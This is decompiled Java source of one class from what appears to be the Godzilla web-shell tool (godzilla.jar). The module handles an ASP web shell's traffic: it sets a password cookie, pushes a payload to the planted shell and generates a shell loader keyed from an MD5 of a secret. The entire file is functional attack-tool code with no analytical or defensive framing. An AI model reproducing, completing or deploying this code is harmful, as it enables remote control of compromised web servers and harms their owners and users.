/*    */ package shells.cryptions.aspXor;
/*    */ 
/*    */ import core.annotation.CryptionAnnotation;
/*    */ import core.imp.Cryption;
/*    */ import core.shell.ShellEntity;
/*    */ import util.Log;
/*    */ import util.functions;
/*    */ import util.http.Http;
/*    */ 
/*    */ 
/*    */ @CryptionAnnotation(Name = "ASP_RAW", payloadName = "AspDynamicPayload")
/*    */ public class AspRaw
/*    */   implements Cryption
/*    */ {
/*    */   private ShellEntity shell;
/*    */   private Http http;
/*    */   private byte[] key;
/*    */   private boolean state;
/*    */   private byte[] payload;
/*    */   
/*    */   public void init(ShellEntity context) {
/* 22 */     this.shell = context;
/* 23 */     this.http = this.shell.getHttp();
/* 24 */     this.key = this.shell.getSecretKeyX().getBytes();
/* 25 */     this.shell.getHeaders().put("Content-Type", "application/octet-stream");
/* 26 */     if (this.shell.getHeaders().get("Cookie") == null) {
/* 27 */       this.shell.getHeaders().put("Cookie", String.format("%s=%s;", new Object[] { context.getPassword(), "user" }));
/*    */     }
/*    */     try {
/* 30 */       this.payload = this.shell.getPayloadModule().getPayload();
/* 31 */       if (this.payload != null) {
/* 32 */         this.http.sendHttpResponse(this.payload);
/* 33 */         this.state = true;
/*    */       } else {
/* 35 */         Log.error("payload Is Null");
/*    */       }
/*    */     
/* 38 */     } catch (Exception e) {
/* 39 */       Log.error(e);
/*    */       return;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] encode(byte[] data) {
/*    */     try {
/* 48 */       return data;
/* 49 */     } catch (Exception e) {
/* 50 */       Log.error(e);
/* 51 */       return null;
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] decode(byte[] data) {
/* 58 */     if (data != null && data.length > 0) {
/*    */       try {
/* 60 */         return data;
/* 61 */       } catch (Exception e) {
/* 62 */         Log.error(e);
/* 63 */         return null;
/*    */       } 
/*    */     }
/* 66 */     return data;
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public boolean isSendRLData() {
/* 74 */     return false;
/*    */   }
/*    */ 
/*    */   
/*    */   public boolean check() {
/* 79 */     return this.state;
/*    */   }
/*    */ 
/*    */ 
/*    */   
/*    */   public byte[] generate(String password, String secretKey) {
/* 85 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), getClass().getSimpleName());
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\aspXor\AspRaw.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */